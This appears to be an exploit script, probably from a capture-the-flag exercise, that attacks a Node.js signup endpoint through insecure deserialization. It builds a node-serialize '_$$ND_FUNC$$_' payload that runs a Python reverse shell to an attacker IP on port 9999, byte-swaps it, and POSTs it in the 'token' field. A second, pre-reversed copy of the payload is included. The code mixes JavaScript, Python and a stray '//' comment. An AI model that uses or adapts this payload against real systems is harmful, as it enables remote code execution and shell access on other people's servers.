
'''
const changeEndianness = (string) => {
 const result = [];
 let len = string.length - 2;
 while (len >= 0) {
   result.push(string.substr(len, 2));
   len -= 2;
 }
 return result.join('');
}
'''
 
 
import requests
 
URI = 'http://localhost:8000'
 
load = '''{"rce":"_$$ND_FUNC$$_function () { require('child_process').exec(`python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"[your pubic ip to get a reverse shell ]\\\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\'`, function(error, stdout, stderr){ })}()" }'''
pl = '''   })\"}(}){ r)ertd st,outd sr,roern(ioctun f`,;\'])\\\"-i\\\"\",h\\/sin/b\\\"([llcas.esocprub=s;p2)),o(enil.f(sp2dus. o);,1()nolefis.2(up.dos; 0)),o(enil.f(sp2dus.;o))9999\",8\\.4.265.116\"2(\\t(ecnncos.);AMRESTK_OC.SetcksoT,NE_IAFt.keoc(setcksot.keoc=s;soss,esocprub,setcksot ormp\'ic  -onthpy(`ecex).s\'esocprd_ilch(\'reuieq r {()n ioctun_f$$NCFUD_$N_$:\"e\"rc{\"'''
 
//based on the length of payoad you need to add extra space or so because payload must be on even lenth because of the transformation we are doing in background
 
 
def send_payload():
 
  body = {
    'name': 'bebafeca',
    'token': Given_change(load),
  }
 
  resp = requests.post(f'{URI}/signup', data=body)
  print(resp.text)
 
 
def Given_change(string):
    res = []
    length = len(string)-2
    while length >=0:
        res.append(string[length:length+2])
        length -=2
    print("".join(res))
    return "".join(res)
 
 
if __name__ == '__main__':
  send_payload()